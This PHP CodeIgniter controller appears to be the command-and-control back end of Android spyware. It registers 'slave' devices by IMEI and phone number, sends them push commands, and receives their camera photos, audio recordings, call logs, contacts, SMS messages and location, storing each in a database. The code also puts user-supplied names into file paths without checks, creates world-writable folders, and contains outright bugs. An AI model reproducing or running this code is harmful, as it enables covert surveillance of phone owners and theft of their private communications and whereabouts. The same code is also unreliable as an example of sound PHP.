
<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');

class api extends CI_Controller {


	public function api(){
        	parent::__construct();
			$this->load->helper(array('form', 'url'));


		if (preg_match('/index.php/i', $_SERVER['REQUEST_URI'])) {
			if ($this->config->item('index_page') == '') {
				redirect('api');
			}

    	die();
		}
        parse_str( $_SERVER['QUERY_STRING'], $_REQUEST );

    }
	public function index()

	{	$this->load->model('model');
		$data=array("users"=>$this->model->getUsers());


	}



	public function logout()
	{
		$this->session->sess_destroy();
		redirect("home/login");
	}

	public function addCall()
	{

			 $this->load->model("model");
			 $bool=$this->model->addCall($this->input->post('calls'));


	}

	public function addContact()
	{

			 $this->load->model("model");
			 $bool=$this->model->addContact($this->input->post('`contacts`'),$this->input->post('id'));


	}

	public function addMessage()
	{

			 $this->load->model("model");
			 $bool=$this->model->addMessage($this->input->post('messages'));


	}

		public function sendPush()
	{

			 $this->load->model("model");
			 $bool=$this->model->sendPush($this->input->post('detail'),$this->input->post('gcm_regid'));


	}

		public function addDetail()
	{

			 $this->load->model("model");
			 $bool=$this->model->addDetail($this->input->post('type'),$this->input->post('detail'),$this->input->post('username'),$this->input->post('slaveid'),$this->input->post('imei'),$this->input->post('phonenumber'),$this->input->post('device'));


	}
		public function do_upload()
	{

			 $this->load->model("model");
			 $type=$this->input->post('type');
			 $gcm = $this->input->post('gcm');
			 $name = $this->input->post('username');


switch ($type) {

    case 'camera':

$this->load->helper('date');
$now = time();
$now= unix_to_human($now, TRUE, 'us');
$now= $now;
$rand = substr($gcm, -5);
$path="./camera/".$name."/".$rand."/";
if(!file_exists($path))
mkdir($path,0777, true);
$config['upload_path'] = $path;
$config['allowed_types'] = 'gif|jpg|png';
$config['file_name']  = $file;
$config['overwrite']  = TRUE;
$this->load->library('upload', $config);
$up=$this->upload->do_upload("file");
   //  sleep(5);
   //  $thumbpath=$path."/thumbs/";
   //  $thumbfile=$thumbpath.$now;
   //  if(!file_exists($thumbpath))
   //  mkdir($thumbpath,0777, true);
	  // $img = imagecreatefromjpeg( $thumbfile );
   //    $width = imagesx( $img );
   //    $height = imagesy( $img );
   //    $thumbWidth = "300";
   //    $new_height = "300";
   //    $new_width =floor( $height * ( $thumbWidth / $width ) );
   //    $tmp_img = imagecreatetruecolor( $new_width, $new_height );
   //    imagecopyresized( $tmp_img, $img, 0, 0, 0, 0, $new_width, $new_height, $width, $height );
   //    imagejpeg( $tmp_img, $thumbfile );

if($up){

  echo "Photo Uploaded";

}


else
  echo "Photo Error";
echo $this->upload->display_errors();

break;


	case 'audio':
$this->load->helper('date');
$now = time();
$now= unix_to_human($now, TRUE, 'us');
$rand = substr($gcm, -5);
$random = rand(999,9999);

$path="./audio/".$name."/".$rand."/";
if(!file_exists($path))
mkdir($path,0777, true);


$config['upload_path'] = $path;
$config['allowed_types'] = 'mp4';
$config['file_name']  = $now;
$config['overwrite']  = TRUE;
$this->load->library('upload', $config);


    $up=$this->upload->do_upload("file");

if($up){

  echo "uploaded";

}


else
  echo "Audio Uploaded";
echo $this->upload->display_errors();

break;

case 'call':

$rand = substr($gcm, -5);
$path="./details/".$name."/".$rand."/";
if(!file_exists($path))
mkdir($path,0777, true);

$config['upload_path'] = $path;
$config['allowed_types'] = 'txt';
$config['file_name']  = "call";
$config['overwrite']  = TRUE;
$this->load->library('upload', $config);
$up=$this->upload->do_upload("file");

if($up){
echo "Call Uploaded";
$detail=file_get_contents($path."call.txt");
$state="recieved";
$where=array('slaveid'=>$gcm);
$this->db->where($where);
$data=array('calls'=>$detail,'callstate'=>$state);
$this->db->update('slaves',$data);
unlink($path."call.txt");
}
else
{
	echo $this->upload->display_errors();

}
break;

case 'contacts':

$rand = substr($gcm, -5);
$path="./details/".$name."/".$rand."/";
if(!file_exists($path))
mkdir($path,0777, true);
$config['upload_path'] = $path;
$config['allowed_types'] = 'txt';
$config['file_name']  = "contacts";
$config['overwrite']  = TRUE;
$this->load->library('upload', $config);
$up=$this->upload->do_upload("file");
if($up){

$state="recieved";
$detail=file_get_contents($path."contacts.txt");
$where=array('slaveid'=>$gcm);
$this->db->where($where);
$data=array('contacts'=>$detail,'contactstate'=>$state);
$this->db->update('slaves',$data);
unlink($path."contacts.txt");
echo "Contacts Uploaded";

}
else
{
echo $this->upload->display_errors();
}
break;

case 'sms':

$rand = substr($gcm, -5);
$path="./details/".$name."/".$rand."/";
if(!file_exists($path))
mkdir($path,0777, true);

$config['upload_path'] = $path;
$config['allowed_types'] = 'txt';
$config['file_name']  = "sms";
$config['overwrite']  = TRUE;
$this->load->library('upload', $config);
$up=$this->upload->do_upload("file");

if($up){
echo "SMS Uploaded";
$state="recieved";
$detail=file_get_contents($path."sms.txt");
$where=array('slaveid'=>$gcm);
$this->db->where($where);
$data=array('messages'=>$detail,'smsstate'=>$state);
$this->db->update('slaves',$data);
unlink($path."sms.txt");
}
else
{
	echo $this->upload->display_errors();

}
break;


case 'location':

$rand = substr($gcm, -5);
$path="./details/".$name."/".$rand."/";
if(!file_exists($path))
mkdir($path,0777, true);

$config['upload_path'] = $path;
$config['allowed_types'] = 'txt';
$config['file_name']  = "location";
$config['overwrite']  = TRUE;
$this->load->library('upload', $config);
$up=$this->upload->do_upload("file");

if($up){
echo "Location Uploaded";
$state="recieved";
$detail=file_get_contents($path."location.txt");
$where=array('slaveid'=>$gcm);
$this->db->where($where);
$data=array('location'=>$detail,'locstate'=>$state);
$this->db->update('slaves',$data);
unlink($path."location.txt");
}
else
{
	echo $this->upload->display_errors();

}
break;

default:
echo "Contacts Error";
break;
}


}


}
